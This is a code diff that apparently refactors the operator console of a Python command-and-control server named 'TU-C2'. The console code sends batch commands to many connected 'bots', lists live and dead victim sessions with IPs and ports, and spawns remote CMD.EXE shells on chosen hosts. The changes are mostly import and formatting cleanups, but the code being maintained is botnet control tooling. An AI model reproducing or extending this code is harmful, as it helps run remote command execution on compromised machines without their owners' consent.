@@ -8,11 +8,13 @@ import queue
 import time
 
 # Project imports
-from handler import Handler
-from server import batchList, aliveConnections, deadConnections, clientAddressList
+import handler
+import server
+# from handler import Handler
+# from server import batchList, aliveConnections, deadConnections, clientAddressList
 
 class Interpreter(threading.Thread):
-    def __init__(self, qv2):
+    def __init__(self):
         threading.Thread.__init__(self)     # Spawn a new thread for itself
         #self.q = qv2                        # Queue used for issuing commands
 
@@ -75,11 +77,8 @@ class Interpreter(threading.Thread):
         self.clearScreen()
 
         print("[* Interpreter-Msg] Entering Batch-Mode execution.\n")
-        print 
         print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
         print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")
-        print
-        print
 
         bm_success = False
         bm_entry = ''
@@ -98,9 +97,9 @@ class Interpreter(threading.Thread):
                     print(f"[* Interpreter-Msg] Error: {ex}")
                     bm_success = False
                 else:
-                    for conn in aliveConnections:
+                    for conn in server.aliveConnections:
                         if conn.getID() in idlist:
-                            batchList.append(conn)
+                            server.batchList.append(conn)
                     bm_success = True
 
 
@@ -120,10 +119,10 @@ class Interpreter(threading.Thread):
                 batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                 
                 if(batch_cmd.casefold() == "quit" or batch_cmd.casefold() == "q"):
-                    batchList.clear()
+                    server.batchList.clear()
                     break
                 elif (batch_cmd.casefold() == "exit"):
-                    batchList.clear()
+                    server.batchList.clear()
                     self.exit()
                 elif (batch_cmd.casefold() == "shell"):
                     print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
@@ -131,8 +130,8 @@ class Interpreter(threading.Thread):
                     continue
                 else:
                     try:
-                        print(f"[+] Sending Command: {batch_cmd} to {str(len(aliveConnections))} bots")
-                        for conn in batchList:                                     
+                        print(f"[+] Sending Command: {batch_cmd} to {str(len(server.aliveConnections))} bots")
+                        for conn in server.batchList:                                     
                             time.sleep(0.1)
                             print  
                             print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
@@ -179,8 +178,8 @@ class Interpreter(threading.Thread):
 #                     activeConnections.remove(conn)
 #------------------------------------------------------------------------------------------------------------------------------
     def exit(self):
-        print(f"[* Interpreter-Msg] Closing connection to {str(len(aliveConnections))} bots")
-        for conn in aliveConnections:                                         
+        print(f"[* Interpreter-Msg] Closing connection to {str(len(server.aliveConnections))} bots")
+        for conn in server.aliveConnections:                                         
             time.sleep(0.1)
             conn.execute("exit")
 
@@ -189,22 +188,22 @@ class Interpreter(threading.Thread):
         os._exit(0)
 #------------------------------------------------------------------------------------------------------------------------------
     def listAlive(self): # Change to listAlive(self)
-        print("---------------------------")
+        print(".-------------------------.")
         print("| List of Alive Sessions  |")
-        print("----------------------------------")
+        print(":--------------------------------.")
 
-        for conn in aliveConnections:
+        for conn in server.aliveConnections:
             print("| %4d | %16s | %5d |"% (conn.getID(), conn.getIP(), conn.getPort()))
-            print("----------------------------------")
+            print(":--------------------------------:")
 #------------------------------------------------------------------------------------------------------------------------------
     def listDead(self):
-        print("---------------------------")
+        print(".-------------------------.")
         print("| List of Dead Sessions   |")
-        print("----------------------------------")
+        print(":--------------------------------.")
 
-        for session in deadConnections:
+        for session in server.deadConnections:
             print("| %4d | %16s | %5d |"% (session[0], session[1], session[2]))
-            print("----------------------------------")
+            print(":--------------------------------:")
 #------------------------------------------------------------------------------------------------------------------------------
     # def listAll(self):
     #     print("---------------------------")
@@ -225,7 +224,7 @@ class Interpreter(threading.Thread):
         print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")
 
         shellExecStatus = False
-        for conn in aliveConnections:
+        for conn in server.aliveConnections:
             if conn.getID() == id:
                 shellExecStatus = conn.shell()
 
